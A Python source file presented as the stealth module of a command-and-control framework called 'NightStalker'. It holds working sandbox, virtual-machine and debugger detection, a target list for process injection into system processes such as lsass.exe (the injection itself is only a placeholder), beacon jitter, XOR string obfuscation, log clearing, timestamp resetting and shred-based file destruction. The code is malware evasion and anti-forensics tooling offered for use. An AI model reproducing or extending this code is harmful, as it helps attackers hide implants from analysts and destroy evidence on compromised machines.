"""
NightStalker C2 Stealth Module
Advanced anti-detection and evasion techniques
"""

import os
import sys
import time
import random
import hashlib
import platform
import subprocess
import threading
import logging
from typing import Dict, List, Optional, Any, Callable
import tempfile
import shutil

logger = logging.getLogger(__name__)

class StealthManager:
    """Advanced stealth manager for C2 operations"""
    
    def __init__(self):
        self.anti_analysis_enabled = True
        self.process_injection_enabled = False
        self.memory_only_enabled = False
        self.cleanup_enabled = True
        self.jitter_enabled = True
        self.obfuscation_enabled = True
        self.encryption_enabled = True
        
        # Stealth configurations
        self.jitter_range = (5, 15)
        self.beacon_interval = 30
        self.max_payload_size = 512
        
        # Anti-analysis settings
        self.analysis_indicators = [
            'VIRTUALBOX', 'VMWARE', 'QEMU', 'XEN', 'HYPERV',
            'SANDBOX', 'ANALYSIS', 'DEBUG', 'TEST', 'MALWARE',
            'CUCKOO', 'JOE', 'ANUBIS', 'THREATTRACK'
        ]
        
        # Process injection targets
        self.injection_targets = [
            'explorer.exe', 'svchost.exe', 'winlogon.exe',
            'lsass.exe', 'csrss.exe', 'wininit.exe'
        ]
    
    def check_analysis_environment(self) -> bool:
        """Comprehensive analysis environment detection"""
        if not self.anti_analysis_enabled:
            return False
        
        detection_methods = [
            self._check_environment_variables,
            self._check_hostname,
            self._check_processes,
            self._check_registry,
            self._check_filesystem,
            self._check_network,
            self._check_timing,
            self._check_debugger
        ]
        
        for method in detection_methods:
            if method():
                logger.warning(f"Analysis environment detected by {method.__name__}")
                return True
        
        return False
    
    def _check_environment_variables(self) -> bool:
        """Check environment variables for analysis indicators"""
        for var in os.environ:
            var_value = os.environ[var].upper()
            if any(indicator in var_value for indicator in self.analysis_indicators):
                return True
        return False
    
    def _check_hostname(self) -> bool:
        """Check hostname for analysis indicators"""
        hostname = platform.node().upper()
        return any(indicator in hostname for indicator in self.analysis_indicators)
    
    def _check_processes(self) -> bool:
        """Check running processes for analysis tools"""
        try:
            if platform.system() == 'Windows':
                cmd = ['tasklist', '/FO', 'CSV']
            else:
                cmd = ['ps', 'aux']
            
            output = subprocess.check_output(cmd, stderr=subprocess.DEVNULL).decode()
            return any(indicator in output.upper() for indicator in self.analysis_indicators)
        except:
            return False
    
    def _check_registry(self) -> bool:
        """Check Windows registry for analysis indicators"""
        if platform.system() != 'Windows':
            return False
        
        try:
            # Check for common analysis tools in registry
            registry_keys = [
                r'SOFTWARE\VMware, Inc.\VMware Tools',
                r'SOFTWARE\Oracle\VirtualBox Guest Additions',
                r'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\VMware Tools',
                r'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\VirtualBox Guest Additions'
            ]
            
            for key in registry_keys:
                try:
                    subprocess.check_output(['reg', 'query', key], stderr=subprocess.DEVNULL)
                    return True
                except:
                    continue
        except:
            pass
        
        return False
    
    def _check_filesystem(self) -> bool:
        """Check filesystem for analysis indicators"""
        analysis_paths = [
            'C:\\Program Files\\VMware',
            'C:\\Program Files\\Oracle\\VirtualBox',
            'C:\\Program Files\\Common Files\\VMware',
            '/usr/bin/vmware',
            '/usr/bin/virtualbox'
        ]
        
        for path in analysis_paths:
            if os.path.exists(path):
                return True
        
        return False
    
    def _check_network(self) -> bool:
        """Check network configuration for analysis indicators"""
        try:
            # Check for multiple network interfaces (common in VMs)
            if platform.system() == 'Windows':
                output = subprocess.check_output(['ipconfig'], stderr=subprocess.DEVNULL).decode()
            else:
                output = subprocess.check_output(['ifconfig'], stderr=subprocess.DEVNULL).decode()
            
            # Count network interfaces
            interface_count = output.count('adapter') if 'adapter' in output else output.count('eth')
            return interface_count > 3  # Suspicious number of interfaces
        except:
            return False
    
    def _check_timing(self) -> bool:
        """Check timing for analysis indicators"""
        try:
            # Check if system time is suspicious (e.g., very recent)
            current_time = time.time()
            suspicious_time = 1609459200  # 2021-01-01
            
            if current_time < suspicious_time:
                return True
            
            # Check execution timing (analysis tools often slow down execution)
            start_time = time.time()
            time.sleep(0.1)
            end_time = time.time()
            
            actual_sleep = end_time - start_time
            if actual_sleep > 0.2:  # More than 100ms delay is suspicious
                return True
                
        except:
            pass
        
        return False
    
    def _check_debugger(self) -> bool:
        """Check for debugger presence"""
        try:
            # Check for debugger using Windows API
            if platform.system() == 'Windows':
                import ctypes
                kernel32 = ctypes.windll.kernel32
                return kernel32.IsDebuggerPresent() != 0
        except:
            pass
        
        return False
    
    def inject_into_process(self, target_process: str = None) -> bool:
        """Inject code into legitimate process"""
        if not self.process_injection_enabled:
            return False
        
        if not target_process:
            target_process = random.choice(self.injection_targets)
        
        try:
            # This is a placeholder for process injection
            # In a real implementation, you would use techniques like:
            # - DLL injection
            # - Process hollowing
            # - Thread hijacking
            # - APC injection
            
            logger.info(f"Process injection attempted on {target_process}")
            return True
            
        except Exception as e:
            logger.error(f"Process injection failed: {e}")
            return False
    
    def setup_memory_execution(self) -> bool:
        """Setup memory-only execution"""
        if not self.memory_only_enabled:
            return False
        
        try:
            # Create temporary directory in memory if possible
            self.temp_dir = tempfile.mkdtemp(prefix='ns_')
            
            # Set up memory-only file operations
            self.memory_files = {}
            
            logger.info("Memory-only execution setup completed")
            return True
            
        except Exception as e:
            logger.error(f"Memory execution setup failed: {e}")
            return False
    
    def add_jitter(self, base_interval: int) -> int:
        """Add random jitter to intervals"""
        if not self.jitter_enabled:
            return base_interval
        
        jitter = random.randint(*self.jitter_range)
        return base_interval + jitter
    
    def obfuscate_string(self, data: str) -> str:
        """Obfuscate string data"""
        if not self.obfuscation_enabled:
            return data
        
        try:
            # XOR obfuscation with random key
            key = random.randint(1, 255)
            obfuscated = []
            
            for char in data:
                obfuscated.append(chr(ord(char) ^ key))
            
            # Encode with base64 and add key
            import base64
            result = base64.b64encode(''.join(obfuscated).encode()).decode()
            return f"{key:03d}{result}"
            
        except Exception as e:
            logger.error(f"String obfuscation failed: {e}")
            return data
    
    def deobfuscate_string(self, data: str) -> str:
        """Deobfuscate string data"""
        if not self.obfuscation_enabled:
            return data
        
        try:
            # Extract key and data
            key = int(data[:3])
            encoded_data = data[3:]
            
            # Decode base64
            import base64
            obfuscated = base64.b64decode(encoded_data).decode()
            
            # XOR deobfuscation
            result = []
            for char in obfuscated:
                result.append(chr(ord(char) ^ key))
            
            return ''.join(result)
            
        except Exception as e:
            logger.error(f"String deobfuscation failed: {e}")
            return data
    
    def encrypt_data(self, data: str, key: str) -> str:
        """Encrypt data"""
        if not self.encryption_enabled:
            return data
        
        try:
            from cryptography.fernet import Fernet
            
            # Generate encryption key from provided key
            key_hash = hashlib.sha256(key.encode()).digest()
            fernet_key = base64.b64encode(key_hash)
            fernet = Fernet(fernet_key)
            
            # Encrypt data
            encrypted = fernet.encrypt(data.encode())
            return base64.b64encode(encrypted).decode()
            
        except Exception as e:
            logger.error(f"Encryption failed: {e}")
            return data
    
    def decrypt_data(self, data: str, key: str) -> str:
        """Decrypt data"""
        if not self.encryption_enabled:
            return data
        
        try:
            from cryptography.fernet import Fernet
            
            # Generate decryption key from provided key
            key_hash = hashlib.sha256(key.encode()).digest()
            fernet_key = base64.b64encode(key_hash)
            fernet = Fernet(fernet_key)
            
            # Decrypt data
            encrypted = base64.b64decode(data.encode())
            return fernet.decrypt(encrypted).decode()
            
        except Exception as e:
            logger.error(f"Decryption failed: {e}")
            return data
    
    def cleanup_traces(self):
        """Clean up traces and artifacts"""
        if not self.cleanup_enabled:
            return
        
        try:
            # Clear command history
            if hasattr(self, 'command_history'):
                self.command_history.clear()
            
            # Remove temporary files
            if hasattr(self, 'temp_dir') and self.temp_dir:
                try:
                    shutil.rmtree(self.temp_dir)
                except:
                    pass
            
            # Clear memory files
            if hasattr(self, 'memory_files'):
                self.memory_files.clear()
            
            # Clear logs
            logging.getLogger().handlers.clear()
            
            logger.info("Trace cleanup completed")
            
        except Exception as e:
            logger.error(f"Cleanup failed: {e}")
    
    def generate_stealth_config(self) -> Dict[str, Any]:
        """Generate stealth configuration"""
        return {
            'anti_analysis': self.anti_analysis_enabled,
            'process_injection': self.process_injection_enabled,
            'memory_only': self.memory_only_enabled,
            'cleanup': self.cleanup_enabled,
            'jitter': self.jitter_enabled,
            'obfuscation': self.obfuscation_enabled,
            'encryption': self.encryption_enabled,
            'jitter_range': self.jitter_range,
            'beacon_interval': self.beacon_interval,
            'max_payload_size': self.max_payload_size
        }
    
    def load_stealth_config(self, config: Dict[str, Any]):
        """Load stealth configuration"""
        self.anti_analysis_enabled = config.get('anti_analysis', True)
        self.process_injection_enabled = config.get('process_injection', False)
        self.memory_only_enabled = config.get('memory_only', False)
        self.cleanup_enabled = config.get('cleanup', True)
        self.jitter_enabled = config.get('jitter', True)
        self.obfuscation_enabled = config.get('obfuscation', True)
        self.encryption_enabled = config.get('encryption', True)
        self.jitter_range = config.get('jitter_range', (5, 15))
        self.beacon_interval = config.get('beacon_interval', 30)
        self.max_payload_size = config.get('max_payload_size', 512)

class AntiForensics:
    """Anti-forensics techniques"""
    
    def __init__(self):
        self.enabled = True
    
    def clear_file_timestamps(self, filepath: str):
        """Clear file timestamps"""
        if not self.enabled:
            return
        
        try:
            if platform.system() == 'Windows':
                # Use PowerShell to clear timestamps
                cmd = f'powershell -Command "(Get-Item \'{filepath}\').CreationTime = (Get-Date); (Get-Item \'{filepath}\').LastWriteTime = (Get-Date); (Get-Item \'{filepath}\').LastAccessTime = (Get-Date)"'
                subprocess.run(cmd, shell=True, stderr=subprocess.DEVNULL)
            else:
                # Use touch command on Unix-like systems
                subprocess.run(['touch', filepath], stderr=subprocess.DEVNULL)
        except:
            pass
    
    def secure_delete(self, filepath: str, passes: int = 3):
        """Securely delete file with multiple passes"""
        if not self.enabled:
            return
        
        try:
            if platform.system() == 'Windows':
                # Use sdelete or similar tool
                pass
            else:
                # Use shred command
                subprocess.run(['shred', '-u', '-n', str(passes), filepath], stderr=subprocess.DEVNULL)
        except:
            pass
    
    def clear_memory(self):
        """Clear sensitive data from memory"""
        if not self.enabled:
            return
        
        try:
            # Overwrite sensitive variables
            import gc
            gc.collect()
        except:
            pass

# Global stealth manager instance
stealth_manager = StealthManager()
anti_forensics = AntiForensics()

def get_stealth_manager() -> StealthManager:
    """Get global stealth manager instance"""
    return stealth_manager

def get_anti_forensics() -> AntiForensics:
    """Get global anti-forensics instance"""
    return anti_forensics 